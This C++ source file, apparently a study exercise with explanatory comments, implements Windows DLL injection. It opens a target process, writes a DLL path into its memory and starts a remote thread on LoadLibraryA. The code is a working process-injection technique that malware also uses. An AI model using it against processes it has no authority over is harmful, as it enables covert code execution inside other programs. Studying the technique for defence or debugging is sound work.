// RemoteThreadInjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>

int Error(const char* msg) { //declare error - standard
    printf("%s (%u)/n", msg, GetLastError());
    return 1;
}

int main(int argc, const char* argv[]) { //here we tell main to accept arguments, with a handler if the correct number args is not given
    if (argc < 3) {
        printf("Usage: remotethread <pid> <dllpath>\n");
        return 0;
    }
    
    int pid = atoi(argv[1]); //convert arg to PID

    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, pid); //open handle to process, first arg is the level of access we want to open the handle with - too much and the handle will fail, too little and the handle will be too weak
    if (!hProcess)
        return Error("Error opening process");

    void* buffer = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //allocate memory into target process, when the loadlibrary function is called, it must be called with a ptr to a buffer in the process where load library is being claled from (the target process)
    // a note on the above args, specifically the memory flags. We allocate both COMMIT and RESERVE as we want to reserve a egion and immediately commit.
    if (!buffer)
        return Error("Failed to allocate memory");

    if (!WriteProcessMemory(hProcess, buffer, argv[2], strlen(argv[2]), nullptr)) //now we write the dll path to our allocated memory
        return Error("failed to write memory");

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, //create thread in target proc and instruct the thread to load our dll
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryA"), //locate loadlibrary function in memory so that we can instruct the new thread to load - we chose LoadLibraryA(scii) because we provided the dll library as an ascii string in arg
        buffer, 0, nullptr);
    if (!hThread)
        return Error("Failed to create thread");

    return 0;
}

